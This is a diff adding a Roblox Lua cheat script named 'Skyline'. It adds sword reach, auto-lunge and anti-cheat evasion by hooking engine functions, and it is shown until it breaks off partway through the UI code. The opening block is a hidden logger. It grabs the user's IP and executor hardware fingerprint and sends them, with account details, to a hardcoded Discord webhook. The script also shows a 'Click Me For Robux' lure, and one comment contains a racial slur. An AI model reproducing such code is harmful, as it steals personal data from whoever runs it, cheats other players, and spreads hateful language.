@@ -1,0 +1,1235 @@
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+ 
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+ 
+ 
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+ 
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+ 
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+ 
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/978409735772590080/dFCOgi_kKcO8hW_wAKPUSlezUGG6639jkCpv88ZX9C32GdgrsXUrToQgvmD8tURX51HQ"
+ 
+ 
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "ALT:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+ 
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+ 
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+ 
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+
+--Fuck that nigger Skyline. Off-brand bastard.
+
+local Version = "2"
+local index
+local clone
+local gettouchingparts
+local getpartsinpart
+local isa
+local uninjected = false
+local ui
+local is_synapse = (syn and syn.protect_gui)
+local MainEvent = Instance.new("BindableEvent")
+local acos = math.acos
+local wait = task.wait
+local spawn = task.spawn
+local find = table.find
+local fake_name = tostring(math.random(1e5,1e9))
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Terrain = workspace.Terrain
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local Backpack = Player.Backpack
+
+getgenv().Skyline_settings = {
+    size = 3,
+    hitrate = 1,
+    damage_mode = "bypsas", --modes: normal, bypass
+    custom_mode = {
+        bypass = true,
+        delay_between_hits = 0, -- seconds
+        end_touch_after = 0, -- seconds
+
+
+        timer = 0, -- dont edit
+    },
+
+    Blockcolor = nil, -- put a color3 value or "rainbow"
+    attack_npcs = true,
+    kill_chat = false,
+    prefix = ".",
+    -- dont edit the values below
+
+    update_functions = {},
+    showrange = false,
+    SkySize = false,
+    hits = 0,
+    lasthit = 0,
+    event = MainEvent,
+    whitelisted = {},
+    commands = {},
+}
+
+-- Intro
+local TweensOut
+local TweensIn
+local Tweening
+local Done = false
+do
+    Tweening = true
+    local Intro = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local UICorner = Instance.new("UICorner")
+    local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+    local Title = Instance.new("TextLabel")
+    local VersionLabel = Instance.new("TextLabel")
+    local LaunchButton = Instance.new("TextButton")
+    local UICorner_2 = Instance.new("UICorner")
+    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+    Intro.Name = "\000"
+    if is_synapse then
+        syn.protect_gui(Intro)
+        Intro.Parent = CoreGui
+    elseif gethui then
+        Intro.Parent = gethui()
+    else
+        Intro.Parent = CoreGui
+    end
+
+    Intro.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    Frame.Parent = Intro
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+    Frame.BackgroundTransparency = 0.3
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+    UICorner.CornerRadius = UDim.new(0, 1)
+    UICorner.Parent = Frame
+
+    UIAspectRatioConstraint.Parent = Frame
+
+    Title.Name = "Title"
+    Title.Parent = Frame
+    Title.AnchorPoint = Vector2.new(0.5, 0.5)
+    Title.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+    Title.BackgroundTransparency = 0.3
+    Title.BorderSizePixel = 0
+    Title.Position = UDim2.new(0.5, 0, 0.25, 0)
+    Title.Size = UDim2.new(1, 0, 0.134782612, 0)
+    Title.Font = Enum.Font.SciFi
+    Title.Text = "Skyline"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextScaled = true
+    Title.TextSize = 14.000
+    Title.TextTransparency = 1
+    Title.TextWrapped = true
+
+    VersionLabel.Name = "Version"
+    VersionLabel.Parent = Frame
+    VersionLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    VersionLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+    VersionLabel.BackgroundTransparency = 0.3
+    VersionLabel.BorderSizePixel = 0
+    VersionLabel.Position = UDim2.new(0.5, 0, 0.38499999, 0)
+    VersionLabel.Size = UDim2.new(1, 0, 0.134782612, 0)
+    VersionLabel.Font = Enum.Font.SciFi
+    VersionLabel.Text = "v" .. Version
+    VersionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    VersionLabel.TextScaled = true
+    VersionLabel.TextSize = 14.000
+    VersionLabel.TextTransparency = 1.000
+    VersionLabel.TextWrapped = true
+
+    LaunchButton.Name = "LaunchButton"
+    LaunchButton.Parent = Frame
+    LaunchButton.AnchorPoint = Vector2.new(0.5, 0.5)
+    LaunchButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+    LaunchButton.BackgroundTransparency = 0.3
+    LaunchButton.TextTransparency = 1
+    LaunchButton.BorderSizePixel = 0
+    LaunchButton.Position = UDim2.new(0.5, 0, 0.743478239, 0)
+    LaunchButton.Size = UDim2.new(0.4, 0, 0.129999995, 0)
+    LaunchButton.Font = Enum.Font.SourceSansSemibold
+    LaunchButton.Text = "Click Me For Robux"
+    LaunchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LaunchButton.TextScaled = true
+    LaunchButton.TextSize = 29.000
+    LaunchButton.TextWrapped = true
+
+    UICorner_2.Parent = LaunchButton
+
+    UITextSizeConstraint.Parent = LaunchButton
+    UITextSizeConstraint.MaxTextSize = 23
+
+
+    TweensIn = {
+        ["1"] = TweenService:Create(LaunchButton,TweenInfo.new(0.2,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{BackgroundTransparency = 1,TextTransparency = 1}),
+        ["2"] = TweenService:Create(VersionLabel,TweenInfo.new(0.3,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{TextTransparency = 1}),
+        ["3"] = TweenService:Create(Title,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{TextTransparency = 1}),	
+        ["4"] = TweenService:Create(Frame,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{Size = UDim2.new(0,0,0,0)}),
+    }
+    TweensOut = {
+        ["1"] = TweenService:Create(Frame,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Size = UDim2.new(0,230,0,230)}),
+        ["2"] = TweenService:Create(Title,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{TextTransparency = 0}),
+        ["3"] = TweenService:Create(VersionLabel,TweenInfo.new(0.3,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{TextTransparency = 0}),
+        ["4"] = TweenService:Create(LaunchButton,TweenInfo.new(0.2,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{BackgroundTransparency = 0,TextTransparency = 0}),	
+    }
+
+    LaunchButton.MouseButton1Click:Connect(function()
+        if not Tweening then
+            for i = 1,4 do
+                local v = TweensIn[tostring(i)]
+                v:Play()
+                v.Completed:Wait()
+            end
+            Intro:Destroy()
+            Done = true
+        end
+    end)
+    
+    for i = 1,4 do
+        local v = TweensOut[tostring(i)]
+        v:Play()
+        v.Completed:Wait()
+    end
+    Tweening = false    
+end
+
+while true do
+    if Done then
+        break
+    end
+    wait()
+end
+
+-- Start
+
+local insert = table.insert
+
+local functions = {}
+
+local Blocks = {}
+local FakeParts = {}
+local FakeTouching = {}
+local FakeHandleHandles = {}
+local MainConnections = {
+    Chat = {}
+}
+
+local LimbNames = {
+    Head = true,
+    Torso = true,
+    HumanoidRootPart = true,
+    ["Left Arm"] = true,
+    ["Right Arm"] = true,
+    ["Left Leg"] = true,
+    ["Right Leg"] = true,
+}
+
+do
+    local Connections = {
+        {UIS.TextBoxFocused,true},
+        {UIS.TextBoxFocusReleased,true},
+        {Terrain.ChildAdded,false},
+        {Terrain.DescendantAdded,false},
+    }
+    if not is_synapse then
+        for i,v in pairs(Connections) do
+            for i2,v2 in pairs(getconnections(v[1])) do
+                if v2.LuaConnection then
+                    local suc,err = pcall(function()
+                        local hook
+                        hook = hookfunction(v2.Function,function(obj)
+                            if v[2] then
+                                if obj:IsDescendantOf(CoreGui) then
+                                    return
+                                end
+                            else
+                                if find(FakeParts,obj) or find(Blocks,obj) or tostring(obj) == fake_name then
+                                    return
+                                end
+                            end
+
+                            return hook(obj)
+                        end)
+                    end)
+                end
+            end
+        end
+        
+        for i,v in pairs(getconnections(workspace.DescendantAdded)) do
+            if v.LuaConnection then
+                local suc,err = pcall(function()
+                    local hook
+                    hook = hookfunction(v.Function,function(obj)
+                        if find(FakeParts,obj) or find(Blocks,obj) or tostring(obj) == fake_name then
+                            return
+                        end
+
+                        return hook(obj)
+                    end)
+                end)
+            end
+        end
+        for i,v in pairs(getconnections(game.DescendantAdded)) do
+            if v.LuaConnection then
+                pcall(function()
+                    local hook
+                    hook = hookfunction(v.Function,newcclosure(function(obj)
+                        if find(FakeParts,obj) or find(Blocks,obj) or tostring(obj) == fake_name then
+                            return
+                        end
+
+                        return hook(obj)
+                    end))
+                end)
+            end
+        end
+    end
+end
+
+functions["deepcopy"] = function(original)
+	local copy = {}
+	for k, v in pairs(original) do
+		if type(v) == "table" then
+			v = functions["deepcopy"](v)
+		end
+		copy[k] = v
+	end
+	return copy
+end
+
+functions["find"] = function(tbl,value)
+    for i = 1,#tbl do
+        if tbl[i] == value then
+            return true
+        end
+    end
+    return false
+end
+
+
+functions["sword"] = function(Sword)
+    local Handle = Sword:FindFirstChild("Handle")
+    if not FakeParts[Handle] then
+        local part = Instance.new("Part")
+        part.Name = fake_name
+        FakeParts[Handle] = part
+        part.CanCollide = false
+        part.Massless = true
+        part.Anchored = true
+        part.Transparency = 1
+
+        local weld = Instance.new("WeldConstraint")
+        weld.Name = fake_name
+        weld.Part0 = part
+        weld.Part1 = Handle
+
+        part.Parent = Terrain
+
+        part.CFrame = Handle.CFrame
+        part.Anchored = true
+        weld.Parent = part
+        part.Anchored = false
+
+
+        part.Size = Vector3.new(1, 0.8, 4)
+    end
+    end
+
+
+functions["get_position"] = function()
+    local x,y = game:GetService("CoreGui")
+    local Position = UDim2.new(0,x,0,y)
+    return Position
+end
+
+
+
+
+functions["search"] = function(name)
+    name = name:lower()
+    local length = name:len()
+
+    for i,v in pairs(Players:GetPlayers()) do
+        local player_name = v.Name
+        player_name = player_name:lower()
+        if player_name:sub(1,length) == name then
+            return v 
+        end
+    end
+
+    return nil
+end
+
+functions["bypasshit"] = function(Hitter,Target,Delay,Delay2,Fake)
+    if FakeTouching[Target] == nil then
+        FakeTouching[Target] = Target
+        local ToHit = {Hitter,unpack(Fake)}
+        
+        for _,v in pairs(ToHit) do
+            firetouchinterest(v,Target,0)
+        end
+        if Delay then
+            wait(Delay)
+        end
+        FakeTouching[Target] = true
+        wait()
+        spawn(function()
+            if Delay2 then
+                wait(Delay2)
+            end
+            FakeTouching[Target] = nil
+        end)
+        for _,v in pairs(ToHit) do
+            firetouchinterest(v,Target,1)
+        end
+    end
+end
+
+functions["hit"] = function(Hitter,FakeHandles,Target)
+    local mode = Skyline_settings.damage_mode
+    if mode == "bypass" then
+        functions["bypasshit"](Hitter,Target,0.1,0.1,FakeHandles)
+		end
+	end
+
+functions["getlimb"] = function(Character,Part)
+    local Limbs = {"Left Hip","Right Hip","Left Shoulder","Right Shoulder","Neck"}
+    for i,v in pairs(Character:FindFirstChild("Torso"):GetChildren()) do
+        if table.find(Limbs,v.Name) and v.ClassName == "Motor6D" then
+            if v.Part1 == Part then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+
+functions["event"] = function(method,...)
+    local args = {...}
+    if method == "size_change" then
+        for i,v in pairs(FakeParts) do
+            local size = Skyline_settings.size
+            v.Size = Vector3.new(1, 0.8, 4)
+        end
+    end
+end
+
+functions["bypass_on"] = function(self)
+    return (Skyline_settings.mode == "bypass")
+end
+
+functions["get_fake_pos"] = function(HRP,Type)
+    if Type == "CF" then
+        local pos = index(HRP,"Position")
+        local cf = index(HRP,"CFrame")
+
+        local LimbToPos = {
+            Head = cf + cf.UpVector*1.5,
+            Torso = cf,
+            HumanoidRootPart = cf,
+            ["Left Arm"] = cf + cf.RightVector*-1.5,
+            ["Right Arm"] = cf + cf.RightVector*1.5,
+            ["Left Leg"] = cf + cf.RightVector*-0.5 - cf.UpVector*2,
+            ["Right Leg"] = cf + cf.RightVector*0.5 - cf.UpVector*2,
+        
+        }
+        return LimbToPos
+    elseif type == "POS" then
+        local pos = index(HRP,"Position")
+        local cf = index(HRP,"CFrame")
+    
+        local LimbToPos = {
+            Head = pos + cf.UpVector*1.5,
+            Torso = pos,
+            HumanoidRootPart = pos,
+            ["Left Arm"] = pos + cf.RightVector*-1.5,
+            ["Right Arm"] = pos + cf.RightVector*1.5,
+            ["Left Leg"] = pos + cf.RightVector*-0.5 - cf.UpVector*2,
+            ["Right Leg"] = pos + cf.RightVector*0.5 - cf.UpVector*2,
+        
+        }
+        return LimbToPos
+    end
+end
+
+
+functions["touchingparts"] = function(p)
+    local touching = gettouchingparts(p)
+    for i,v in pairs(FakeTouching) do
+        if v ~= nil and v ~= true and not functions["find"](touching,v) then
+            table.insert(touching,v)
+        end
+    end
+    return touching
+end
+
+functions["main"] = function()
+    if Player.Character and Player.Character.PrimaryPart and Skyline_settings.SkySize then
+        local Character = Player.Character
+
+        local Root = Character.PrimaryPart
+        local Humanoid = Character:WaitForChild("Humanoid")
+        if Humanoid and Humanoid.Health > 0 then
+
+            local Sword = Character:FindFirstChildOfClass("Tool")
+            local Handle
+
+            if Sword then
+                Handle = Sword:FindFirstChild("Handle")
+
+                local Children = Players:GetPlayers()
+                for i = 1,#Children do
+                    spawn(function()
+                        local Enemy = Children[i]
+                        if Enemy ~= Player and not Skyline_settings.whitelisted[Enemy.UserId] and Enemy.Character and Enemy.Character.PrimaryPart then
+                            local PlayerCharacter = Enemy.Character
+                            local PlayerRoot = PlayerCharacter.PrimaryPart
+                            local Enemy_Humanoid = PlayerCharacter:WaitForChild("Humanoid")
+                            if PlayerRoot and Root and Enemy_Humanoid and ((Handle.Position - PlayerRoot.Position).Magnitude <= Skyline_settings.size) and Enemy_Humanoid.Health > 0 then
+                                local facing = acos(Root.CFrame.LookVector:Dot((PlayerRoot.Position - Root.Position).unit))
+                                if Skyline_settings.legit and facing > 1 then
+                                    return
+                                end
+    
+                                local Limbs = {}
+                                for _,v in pairs(PlayerCharacter:GetChildren()) do
+                                    if functions["getlimb"](PlayerCharacter,v) then
+                                        local ConnectedParts = v:GetConnectedParts()
+    
+                                        local tbl = {}
+                                        for i,v2 in pairs(ConnectedParts) do
+                                            if (v.Position - v2.Position).Magnitude <= 2 then
+                                                insert(tbl,v2)
+                                            end
+                                        end
+    
+                                        Limbs[v] = {v,unpack(tbl)}
+                                    end
+                                end
+    
+
+                                local FakeHandles = {}
+                                if not FakeHandleHandles[Handle] then
+                                    local pos = Handle.Position
+                                    for _,v2 in pairs(Handle:GetConnectedParts()) do
+                                        if v2.Name ~= fake_name then
+                                            if Skyline_settings.damage_mode == "bypass" then
+                                                if (pos - v2.Position).Magnitude <= 0.5 and v2.Size.X > .9 and v2.Size.Y > 0.7 and v2.Size.Z > 3.9 then
+                                                    insert(FakeHandles,v2)
+                                                end
+                                            else
+                                                if (pos - v2.Position).Magnitude <= 0.5 then
+                                                    insert(FakeHandles,v2)
+                                                end
+                                            end
+                                        end
+                                    end
+                                    if #FakeHandles >= 1 then
+                                        if Skyline_settings.damage_mode ~= "bypass" then
+                                            Skyline_settings.damage_mode = "bypass"
+                                        end
+                                    end
+                                    FakeHandleHandles[Handle] = FakeHandles
+                                else
+                                    FakeHandles = FakeHandleHandles[Handle]
+                                end
+    
+                               for _,v in pairs(Limbs) do
+                                    for _,v2 in pairs(v) do
+                                        if Skyline_settings.hitrate ~= 0 then
+                                            if Skyline_settings.hits > Skyline_settings.hitrate then
+                                                if tick() - Skyline_settings.lasthit > 0.01 then
+                                                    Skyline_settings.hits = 0
+                                                else
+                                                    continue
+                                                end
+                                            else
+                                                Skyline_settings.hits += 1
+                                                Skyline_settings.lasthit = tick()
+                                            end
+                                        end
+                                        if Enemy_Humanoid.Health <= 0 then
+                                            MainEvent:Fire("death",Enemy,Enemy_Humanoid)
+                                        end
+                                        functions["hit"](Handle,FakeHandles,v2)
+                                    end
+                                    if Enemy_Humanoid.Health <= 0 then
+                                        MainEvent:Fire("death",Enemy,Enemy_Humanoid)
+                                    end
+                                end
+    
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+    end
+    if Skyline_settings.Blockcolor == "rainbow" then
+        local hsv = tick() % 5 / 5
+        MainEvent:Fire("update_range_color",Color3.fromHSV(hsv,1,1))
+        wait()
+    end
+end
+
+
+local ClickRate = 1/60 --1/fps
+local Keybind = Enum.KeyCode.Q
+--------------------------------------------
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local RS = game:GetService("RunService")
+
+local Player = Players.LocalPlayer
+local ACing,AI,Lunging = false,false,{}
+setmetatable(Lunging, {__mode = "kv"})
+local Sword
+local AFK = false
+local function Lunge(CSword)
+    if not Lunging[CSword] and CSword == Sword then
+        Lunging[CSword] = true
+        local Lunged = false
+        local Con = Sword.ChildAdded:Connect(function(i)
+            if i.Name == 'toolanim' and i.Value == 'Lunge' then
+                Lunged = true
+            end
+        end)
+        repeat
+            CSword:Activate(1)
+            local t = tick()
+            repeat RS.RenderStepped:Wait() until tick() - t > ClickRate
+        until CSword ~= Sword or Lunged or not CSword
+        Con:Disconnect()
+    end
+end
+local function Toggle()
+    ACing = not ACing
+    if ACing and Sword then
+        Lunge(Sword)
+    end
+end
+UIS.InputBegan:Connect(function(k,g)
+    if not g and k.KeyCode == Keybind then
+        Toggle()
+    end
+end)
+
+
+local SwordConnections = {}
+setmetatable(SwordConnections, {__mode = "kv"})
+local function AddSwordConnection(CSword)
+    if not SwordConnections[CSword] then
+        SwordConnections[CSword] = true
+        CSword:GetPropertyChangedSignal("Grip"):Connect(function()
+            local G = CSword.GripUp.Z
+            if G == 1 then
+                Lunging[CSword] = nil
+                if not AFK and ACing and Sword and CSword and Sword == CSword then
+                    Lunge(CSword)
+                end                
+            end
+        end)
+        CSword.Equipped:Connect(function()
+            if ACing then
+                wait()
+                Lunge(CSword)
+            end
+        end)
+    end
+end
+
+local function onCharAdded(Char)
+    Sword = Char:FindFirstChildOfClass("Tool")
+    Char.ChildAdded:Connect(function(i)
+        if i.ClassName == 'Tool' then
+            Sword = i
+            AddSwordConnection(Sword)
+        end
+    end)
+    Char.ChildRemoved:Connect(function(i)
+        if Sword == i then
+            Sword = nil
+        end
+    end)
+end
+Player.CharacterAdded:Connect(onCharAdded)
+if Player.Character then
+    onCharAdded(Player.Character)
+end
+UIS.WindowFocused:connect(function() AFK = false end)
+UIS.WindowFocusReleased:connect(function() AFK = true end)
+
+
+
+-- Commands
+
+
+Skyline_settings.commands.uninject = function(...)
+    uninjected = true
+    for i,v in pairs(MainConnections) do
+        if typeof(v) == "RBXScriptConnection" then
+            v:Disconnect()
+        end
+    end
+    for i,v in pairs(MainConnections["Chat"]) do
+        if typeof(v) == "RBXScriptConnection" then
+            v:Disconnect()
+        end
+    end
+    if ui then
+        ui:Destroy()
+        ui = nil
+    end
+    for i,v in pairs(functions) do
+        functions[i] = function()
+
+        end
+    end
+    getgenv().Skyline_settings = nil
+end
+
+-- Hooking
+
+clone = hookfunction(Instance.new("Part").Clone,newcclosure(function(a)
+    if uninjected then
+        return clone(a)
+    end
+
+    if not checkcaller() and FakeParts[a] then
+        local cl = clone(a)
+        FakeParts[cl] = FakeParts[a]
+        return cl
+    end
+    return clone(a)
+end))
+
+
+gettouchingparts = hookfunction(Instance.new("Part").GetTouchingParts,newcclosure(function(a)
+    if uninjected then
+        return gettouchingparts(a)
+    end
+
+    if not checkcaller() and FakeParts[a] then
+        if functions["bypass_on"]() then
+            return functions["touchingparts"](a)
+        else
+            return gettouchingparts(FakeParts[a])
+        end
+    end
+    return gettouchingparts(a)
+end))
+
+getpartsinpart = hookfunction(workspace.GetPartsInPart,newcclosure(function(_,a)
+    if uninjected then
+        return getpartsinpart(_,a)
+    end
+
+
+    if not checkcaller() and FakeParts[a] then
+        if functions["bypass_on"]() then
+            return functions["touchingparts"](a)
+        else
+            return getpartsinpart(workspace,FakeParts[a])
+        end
+    end
+    return getpartsinpart(_,a)
+end))
+
+isa = hookfunction(Instance.new("Part").IsA,newcclosure(function(a,b)
+    if uninjected then
+        return isa(a,b)
+    end
+
+    if not checkcaller() and find(FakeParts,a) then
+        if b == "BasePart" or b == "Part" then
+            return true
+        else
+            return false
+        end
+    end
+    return isa(a,b)
+end))
+
+
+index = hookmetamethod(game,"__index",newcclosure(function(...)
+    local args = {...}
+    local self,prop = args[1],args[2]
+
+    if uninjected then
+        return index(...)
+    end
+
+    if not checkcaller() then
+        if self and typeof(self) == "Instance" and prop then
+            if FakeTouching[self] then
+                if Skyline_settings.damage_mode == "bypass" then
+                    local filtered_prop = string.match(prop,"%w+")
+                    if filtered_prop:find("Position") then
+                        local suc,err = pcall(function()
+                            return index(self,prop)
+                        end)
+                        if suc then
+                            if index(Player,"Character") then
+                                local Character = index(Player,"Character") 
+                                if Character:FindFirstChildOfClass("Tool") then
+                                    local Tool = Character:FindFirstChildOfClass("Tool")
+                                    if Tool:FindFirstChild("Handle") then
+                                        local Pos = index(Tool:FindFirstChild("Handle"),"Position")
+                                        return Pos
+                                    end
+                                end
+                            end
+                        end
+                    elseif filtered_prop:find("CFrame") then
+                        local suc,err = pcall(function()
+                            return index(self,prop)
+                        end)
+                        if suc then
+                            if index(Player,"Character") then
+                                local Character = index(Player,"Character") 
+                                if Character:FindFirstChildOfClass("Tool") then
+                                    local Tool = Character:FindFirstChildOfClass("Tool")
+                                    if Tool:FindFirstChild("Handle") then
+                                        local Pos = index(Tool:FindFirstChild("Handle"),"CFrame")
+                                        return Pos
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return index(...)
+end))
+
+namecall = hookmetamethod(game,"__namecall",newcclosure(function(...)
+    local self,caller,method,args = ...,getcallingscript(),getnamecallmethod(),{...}; table.remove(args,1)
+
+    if uninjected then
+        return namecall(...)
+    end
+
+    if not checkcaller() and self then
+        if method == "GetTouchingParts" and FakeParts[self] then
+            if functions["bypass_on"]() then
+                return functions["touchingparts"](self)
+            else
+                return namecall(FakeParts[self],unpack(args))
+            end
+        elseif method == "GetPartsInParts" and self == workspace then
+            if FakeParts[args[1]] then
+                if functions["bypass_on"]() then
+                    return functions["touchingparts"](args[1])
+                else
+                    return namecall(FakeParts[args[1]],unpack(args))
+                end
+            end
+
+        elseif method == "Clone" and FakeParts[self] then
+            local cl = clone(self)
+            FakeParts[cl] = FakeParts[self]
+            return cl
+        elseif method == "GetChildren" and self == Terrain then
+            return {}
+        elseif method == "FireServer" and self == MessageEvent then
+            local message = args[1]
+            if message:sub(1,1) == Skyline_settings.prefix then
+                message = message:sub(2)
+                local space_splits = message:split(" ")
+                if Skyline_settings.commands[space_splits[1]] then
+                    local command = Skyline_settings.commands[space_splits[1]]
+                    local args = {}
+                    for i,v in pairs(space_splits) do
+                        if i > 1 then
+                            table.insert(args,v)
+                        end
+                    end
+                    command(unpack(args))
+                    return
+                end
+            end
+        elseif method == "IsA" and (find(FakeParts,self) or find(Blocks,self)) then
+            if args[1] == "BasePart" or args[1] == "Part" then
+                return true
+            end
+            return false
+        end
+    end
+
+    return namecall(...)
+end))
+
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 3 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 2 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
+
+
+local HealthHook
+HealthHook = hookmetamethod(game, "__index", function(z, x)
+    if not checkcaller() then
+        if tostring(z) == "Humanoid" and tostring(x) == "Health" then
+            return 0
+        end
+    end
+    return HealthHook(z, x)
+end)
+
+local MagHook
+MagHook = hookmetamethod(game, "__index", function(self, d)
+    if not checkcaller() then
+        if tostring(d) == "Magnitude" or tostring(d) == "magnitude" then
+            return 2
+        end
+    end
+    return MagHook(self, d)
+end)
+
+-- UI
+
+
+
+ui = Instance.new("ScreenGui")
+ui.DisplayOrder = 2^31-1
+local UIMain = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local UIListLayout = Instance.new("UIListLayout")
+local TextLabel = Instance.new("TextLabel")
+
+ui.Name = "SkylineUI"
+if is_synapse then
+    syn.protect_gui(ui)
+    ui.Parent = CoreGui
+elseif gethui then
+    ui.Parent = gethui()
+else
+    ui.Parent = CoreGui
+end
+ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+UIMain.Name = "UIMain"
+UIMain.Parent = ui
+UIMain.AnchorPoint = Vector2.new(0.5, 0.5)
+UIMain.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+UIMain.BackgroundTransparency = 0.3
+UIMain.BorderSizePixel = 0
+UIMain.Position = UDim2.new(0.939453645, 0, 0.5, 0)
+UIMain.Size = UDim2.new(0.10, 0, 0.30, 0)
+    
+Frame.Parent = UIMain
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(0, 3, 0, 50)
+
+TextLabel.Parent = ui
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 20)
+TextLabel.Font = Enum.Font.SciFi
+TextLabel.Text = "Skyline v" .. Version
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+TextLabel.TextXAlignment = Enum.TextXAlignment.Right
+
+UIListLayout.Parent = UIMain
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 8)
+
+function createSettingBox(name,callback,default,texttype,min,max)
+	local text = default
+	local Setting = Instance.new("Frame")
+	local Label = Instance.new("TextLabel")
+	local Box = Instance.new("TextBox")
+
+
+	Setting.Name = "Setting"
+	Setting.Parent = UIMain
+	Setting.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Setting.BackgroundTransparency = 1.800
+	Setting.BorderSizePixel = 0
+	Setting.Position = UDim2.new(0.0636983067, 0, 0.0351000354, 0)
+	Setting.Size = UDim2.new(0.85, 0, 0.162249923, 0)
+
+	Label.Name = "Label"
+	Label.Parent = Setting
+	Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Label.BackgroundTransparency = 1.000
+	Label.BorderSizePixel = 0
+	Label.Position = UDim2.new(0, 0, 0.0500000007, 0)
+	Label.Size = UDim2.new(1, 0, 0.400000006, 0)
+	Label.Font = Enum.Font.SourceSans
+	Label.Text = string.format("  %s (%s)",name,text)
+	Label.TextColor3 = Color3.fromRGB(255,255,255)
+	Label.TextScaled = true
+	Label.TextSize = 14.000
+	Label.TextStrokeTransparency = 1
+	Label.TextWrapped = true
+	Label.TextXAlignment = Enum.TextXAlignment.Left
+
+	Box.Name = "Box"
+	Box.Parent = Setting
+	Box.AnchorPoint = Vector2.new(0.5, 0)
+	Box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Box.BorderSizePixel = 0
+	Box.Position = UDim2.new(0.5, 0, 0.5, 0)
